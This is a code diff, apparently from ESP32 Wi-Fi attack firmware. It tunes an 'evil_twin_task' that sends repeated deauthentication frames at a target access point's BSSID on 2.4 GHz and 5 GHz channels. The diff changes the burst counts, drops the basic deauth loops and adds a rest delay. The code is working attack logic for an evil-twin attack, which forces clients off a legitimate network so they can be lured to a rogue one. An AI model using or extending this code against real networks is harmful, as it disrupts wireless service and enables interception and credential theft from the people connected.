@@ -102,15 +102,8 @@ static void evil_twin_task(void *pvParameters)
 
     while(evil_twin_running)
     {
-        for(uint8_t burst = 0; burst < 10; burst++) {
+        for(uint8_t burst = 0; burst < 8; burst++) {
             frame_send_err = wifi_attack_deauth_client_negative_tx_power(target->bssid, target->channel, (char *)&target->ssid);
-            if(frame_send_err == ESP_OK) {
-                evil_twin_status.packet_sent_2ghz++;
-                vTaskDelay(pdMS_TO_TICKS(2));
-            }
-        }
-        for(uint8_t burst = 0; burst < 5; burst++) {
-            frame_send_err = wifi_attack_deauth_basic(NULL, target->bssid, 7);
             if(frame_send_err == ESP_OK) {
                 evil_twin_status.packet_sent_2ghz++;
                 vTaskDelay(pdMS_TO_TICKS(2));
@@ -125,21 +118,15 @@ static void evil_twin_task(void *pvParameters)
             }
         }
 
+        vTaskDelay(pdMS_TO_TICKS(SOFTAP_REST_TIME));
 
         /* Deauth 5Ghz twin */
         if(evil_twin_status.has_5ghz_target == true ) {
             if(wifi_set_temporary_channel(twin_on_5ghz.channel, ATTACK_WINDOW) == ESP_OK) {
                 vTaskDelay(pdMS_TO_TICKS(CHANNEL_SWITCH_DELAY));
                 /* Send Burst */
-                for(uint8_t burst = 0; burst < 10; burst++) {
+                for(uint8_t burst = 0; burst < 8; burst++) {
                     frame_send_err = wifi_attack_deauth_client_negative_tx_power(twin_on_5ghz.bssid, twin_on_5ghz.channel, (char *)twin_on_5ghz.ssid);
-                    if(frame_send_err == ESP_OK) {
-                        evil_twin_status.packet_sent_5ghz++;
-                        vTaskDelay(pdMS_TO_TICKS(2));
-                    }
-                }
-                for(uint8_t burst = 0; burst < 5; burst++) {
-                    frame_send_err = wifi_attack_deauth_basic(NULL, twin_on_5ghz.bssid, 7);
                     if(frame_send_err == ESP_OK) {
                         evil_twin_status.packet_sent_5ghz++;
                         vTaskDelay(pdMS_TO_TICKS(2));
